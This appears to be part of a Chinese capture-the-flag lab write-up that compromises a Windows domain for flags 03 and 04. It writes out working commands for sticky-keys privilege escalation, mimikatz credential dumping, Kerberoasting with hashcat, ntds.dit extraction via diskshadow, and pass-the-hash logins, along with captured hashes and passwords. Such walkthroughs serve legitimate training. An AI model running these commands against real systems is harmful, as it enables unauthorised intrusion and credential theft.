+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.14.7     is alive</span><br><span class="line">(icmp) Target 172.22.14.11    is alive</span><br><span class="line">(icmp) Target 172.22.14.16    is alive</span><br><span class="line">(icmp) Target 172.22.14.31    is alive</span><br><span class="line">(icmp) Target 172.22.14.46    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.14.11:135 open</span><br><span class="line">172.22.14.7:135 open</span><br><span class="line">172.22.14.46:139 open</span><br><span class="line">172.22.14.31:139 open</span><br><span class="line">172.22.14.46:80 open</span><br><span class="line">172.22.14.16:80 open</span><br><span class="line">172.22.14.11:139 open</span><br><span class="line">172.22.14.46:135 open</span><br><span class="line">172.22.14.7:80 open</span><br><span class="line">172.22.14.31:135 open</span><br><span class="line">172.22.14.16:22 open</span><br><span class="line">172.22.14.7:139 open</span><br><span class="line">172.22.14.16:8060 open</span><br><span class="line">172.22.14.7:3306 open</span><br><span class="line">172.22.14.7:8080 open</span><br><span class="line">172.22.14.31:1521 open</span><br><span class="line">172.22.14.46:445 open</span><br><span class="line">172.22.14.31:445 open</span><br><span class="line">172.22.14.11:445 open</span><br><span class="line">172.22.14.7:445 open</span><br><span class="line">172.22.14.11:88 open</span><br><span class="line">172.22.14.16:9094 open</span><br><span class="line">[*] alive ports len is: 22</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.14.7</span><br><span class="line">   [-&gt;]XR-JENKINS</span><br><span class="line">   [-&gt;]172.22.14.7</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.14.11</span><br><span class="line">   [-&gt;]XR-DC</span><br><span class="line">   [-&gt;]172.22.14.11</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.14.46</span><br><span class="line">   [-&gt;]XR-0923</span><br><span class="line">   [-&gt;]172.22.14.46</span><br><span class="line">[*] NetBios: 172.22.14.31    WORKGROUP\XR-ORACLE</span><br><span class="line">[*] NetBios: 172.22.14.11    [+]DC XIAORANG\XR-DC</span><br><span class="line">[*] NetBios: 172.22.14.46    XIAORANG\XR-0923</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.14.31</span><br><span class="line">   [-&gt;]XR-ORACLE</span><br><span class="line">   [-&gt;]172.22.14.31</span><br><span class="line">[*] WebTitle: http://172.22.14.16:8060  code:404 len:555    title:404 Not Found</span><br><span class="line">[*] WebTitle: http://172.22.14.7:8080   code:403 len:548    title:None</span><br><span class="line">[*] WebTitle: http://172.22.14.46       code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle: http://172.22.14.16       code:302 len:99     title:None 跳转url: http://172.22.14.16/users/sign_in</span><br><span class="line">[*] WebTitle: http://172.22.14.7        code:200 len:54603  title:XR SHOP</span><br><span class="line">[*] WebTitle: http://172.22.14.16/users/sign_in code:200 len:34961  title:Sign in · GitLab</span><br><span class="line">[+] http://172.22.14.7/www.zip poc-yaml-backup-file</span><br></pre></td></tr></table></figure>
+
+<p>梳理如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.22.14.11 域控 XIAORANG\XR-DC</span><br><span class="line">172.22.14.46 域内主机 XIAORANG\XR-0923</span><br><span class="line">172.22.14.7 非域内主机 【已拿下】</span><br><span class="line">172.22.14.31 非域内主机，oracle服务器</span><br><span class="line">172.22.14.16 非域内主机，gitlab服务器</span><br></pre></td></tr></table></figure>
+
+<p>再回看之前拉取下来的仓库，里面有个<code>credentials.txt</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182111509.png" title="image-20231018211142441" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182111509.png" alt="image-20231018211142441"></a></p>
+<p>而从fscan扫出来的结果里，有一个主机名为<code>XR-0923</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XR-0923 | zhangshuai | wSbEajHzZs</span><br></pre></td></tr></table></figure>
+
+<p>然后看看他的rdp开没开</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q rustscan -a 172.22.14.46 -p 3389</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182132902.png" title="image-20231018213238861" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182132902.png" alt="image-20231018213238861"></a></p>
+<p>发现打开了，然后直接rdp登录</p>
+<h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>查看特权发现没有可利用的点</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182150031.png" title="image-20231018215012994" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182150031.png" alt="image-20231018215012994"></a></p>
+<p>然后还发现当前用户属于Remote Management Users 组，所以可以尝试evil-winrm连接</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182149471.png" title="image-20231018214930323" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182149471.png" alt="image-20231018214930323"></a></p>
+<p>用evil-winrm连接后，特权就多了两个，为啥呢？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182152521.png" title="image-20231018215235475" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182152521.png" alt="image-20231018215235475"></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\zhangshuai\Documents&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">特权信息</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">特权名                        描述           状态</span><br><span class="line">============================= ============== ======</span><br><span class="line">SeRestorePrivilege            还原文件和目录 已启用</span><br><span class="line">SeChangeNotifyPrivilege       绕过遍历检查   已启用</span><br><span class="line">SeIncreaseWorkingSetPrivilege 增加进程工作集 已启用</span><br></pre></td></tr></table></figure>
+
+<p>有了SeRestorePrivilege权限，用户可以写入系统中的任何文件，忽略任何 DACL</p>
+<p>这样就可以通过替换文件的方式得到system权限的shell</p>
+<p>替换粘滞键的二进制文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是会报错</p>
+<p>直接将cmd.exe文件名替换为sethc.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Windows\SYstem32</span><br><span class="line">ren sethc.exe sethc.bak</span><br><span class="line">ren cmd.exe sethc.exe</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182207198.png" title="image-20231018220747157" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182207198.png" alt="image-20231018220747157"></a></p>
+<p>然后锁定用户，再按5次“shift”调出粘滞键即可提权</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182208048.png" title="image-20231018220843894" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182208048.png" alt="image-20231018220843894"></a></p>
+<p>把当前用户添加到管理员组</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators zhangshuai /add</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182214861.png" title="image-20231018221430824" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182214861.png" alt="image-20231018221430824"></a></p>
+<p>注销再重登一下，拿到flag03: <code>flag&#123;80acb8c8-6335-4b4d-8b1d-f88cfe71edac&#125;</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182216279.png" title="image-20231018221617179" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182216279.png" alt="image-20231018221617179"></a></p>
+<p>因为当前主机是在域内的，但<code>zhangshuai</code>这个账户不是域内用户，所以还得到锁屏解密，用粘滞键调出<code>system</code>权限的shell，来进行域内的攻击</p>
+<p>先上传sharphound进行域内信息收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe --CollectionMethods All --Domain xiaorang.lab </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310190957403.png" title="image-20231019095743278" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310190957403.png" alt="image-20231019095743278"></a></p>
+<p>然后再拉到本地，使用Bloodhound进行分析</p>
+<p>可以看到<code>TIANJING</code>用户属于备份管理操作员组</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191018345.png" title="image-20231019101848255" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191018345.png" alt="image-20231019101848255"></a></p>
+<p>而且从之前获取到的信息可以知道，这个机器是在域内的，但是没有账户在域内，所以只有可能是机器账户是属于域内的。从机器账户入手，去域内横向移动</p>
+<p>先用mimikatz抓取一下本地的密码，要用管理员打开cmd，还有记得cmd是换了名字的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 64555 (00000000:0000fc2b)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/10/19 9:10:47</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6be6cedce29e67933fe69b073b27ba7f</span><br><span class="line">         * SHA1     : 71e9cce52596441fe032412e4bc6265d2efe9f5d</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br></pre></td></tr></table></figure>
+
+<p>抓到了机器账户<code>XR-0923$</code>的hash</p>
+<p>而我们现在需要拿到<code>TIANJING</code>用户的凭据，才能进行后续操作。可以知道的是，任何域内账户都是可以请求SPN，来获得一个由服务Hash加密的ST。如果该hash可爆破，那么就可以获得服务的凭据，也就是那个服务对应域内用户的凭据</p>
+<p>先枚举一下域内的SPN</p>
+<p>我这里使用<a target="_blank" rel="noopener" href="https://github.com/cyberark/RiskySPN">RiskySPN</a></p>
+<p>RiskySPNs 是一组 PowerShell 脚本，专注于检测和滥用与 SPN（服务主体名称）关联的帐户。该模块可以帮助蓝队识别有潜在风险的 SPN，并帮助红队利用 Kerberos 和 Active Directory 提升权限</p>
+<p><strong>可以用来查找当前域内注册在用户下的可能包含弱密码的SPN</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\RiskySPNs.psm1</span><br><span class="line"><span class="built_in">Find-PotentiallyCrackableAccounts</span><span class="comment">#查找易受攻击的</span></span><br></pre></td></tr></table></figure>
+
+<p>得用system权限执行，所以还得用粘滞键调出来</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191055079.png" title="image-20231019105546008" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191055079.png" alt="image-20231019105546008"></a></p>
+<p>恰好就是<code>TIANJING</code></p>
+<p>加密方式为<code>RC4-HMAC</code>，该加密算法容易被破解</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191057855.png" title="image-20231019105736802" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191057855.png" alt="image-20231019105736802"></a></p>
+<p><code>tianjing</code>账户下的TERSERV服务和Web服务通过这个<code>xr-0923$</code>都是可以访问的</p>
+<p>利用<code>xr-0923$</code>的凭据去请求SPN来获得ST，并用hashcat爆破</p>
+<p>使用impacket里的<code>GetUserSPNs.py</code></p>
+<p>hashes为<code>xiaorang.lab/xr-0923$</code>用户的hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 GetUserSPNs.py -request  -hashes :6be6cedce29e67933fe69b073b27ba7f <span class="string">&quot;xiaorang.lab/xr-0923$&quot;</span> -outputfile hash.txt -request-user tianjing -dc-ip 172.22.14.11 </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191110539.png" title="image-20231019111009489" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191110539.png" alt="image-20231019111009489"></a></p>
+<p>然后用hashcat爆破用tianjing的凭据加密的ST</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191110932.png" title="image-20231019111045880" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191110932.png" alt="image-20231019111045880"></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt rockyou.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到tianjing用户的凭据:<code>DPQSXSXgh2</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191114563.png" title="image-20231019111440510" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191114563.png" alt="image-20231019111440510"></a></p>
+<p>再看一下tianjing用户的域信息，可以知道在remote management Use组，可以直接用evil-winrm连接</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191406391.png" title="image-20231019140644319" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191406391.png" alt="image-20231019140644319"></a></p>
+<p>同时tianjing用户对dc域控主机有psremote权限，所以可以直接在dc主机上登录tianjing用户</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191416124.png" title="image-20231019111631151" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191416124.png" alt="image-20231019111631151"></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191417994.png" title="image-20231019141728911" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191417994.png" alt="image-20231019141728911"></a></p>
+<h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><p>有很多种通过卷影副本的方式转储ntds.dit，这里使用diskshadow</p>
+<p>将以下命令写进文件里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias v2i</span><br><span class="line">create</span><br><span class="line">expose %v2i% v:</span><br><span class="line">exec &quot;C:\windows\system32\cmd.exe&quot; /c robocopy z:\windows\ntds\ntds.dit c:\ntds.dit</span><br><span class="line">delete shadows volume %v2i%</span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+<p>然后使用命令<code>unix2dos 2.txt</code>转换一下格式，否则执行不了</p>
+<p>在C盘根目录创建一个temp文件夹，将2.txt上传上去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; upload 2.txt</span><br></pre></td></tr></table></figure>
+
+<p>用diskshadow执行2.txt里的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; diskshadow /s 2.txt</span><br></pre></td></tr></table></figure>
+
+<p>将根目录的ntds.dit下载下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; download C:\temp\ntds.dit ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p>还需要将system转储，下载下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\temp&gt; reg save HKLM\SYSTEM system</span><br><span class="line">*Evil-WinRM* PS C:\temp&gt; download C:\temp\system system</span><br></pre></td></tr></table></figure>
+
+<p>下载的时候会比较慢</p>
+<p>使用<code>impacket-secretsdump</code>进行解密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -ntds ntds.dit -system system  LOCAL</span><br></pre></td></tr></table></figure>
+
+<p>得到域管理员nthash：<code>70c39b547b7d8adec35ad7c09fb1d277</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191548253.png" title="image-20231019154825171" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191548253.png" alt="image-20231019154825171"></a></p>
+<p>evil-winrm连接，得到flag04：<code>flag&#123;d686e2c5-da80-4f87-b3cd-ff5c357c1f8d&#125;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q evil-winrm -i 172.22.14.11 -u administrator -H 70c39b547b7d8adec35ad7c09fb1d277 </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191550630.png" title="image-20231019155048535" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310191550630.png" alt="image-20231019155048535"></a></p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/'>
+                            春秋云镜
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
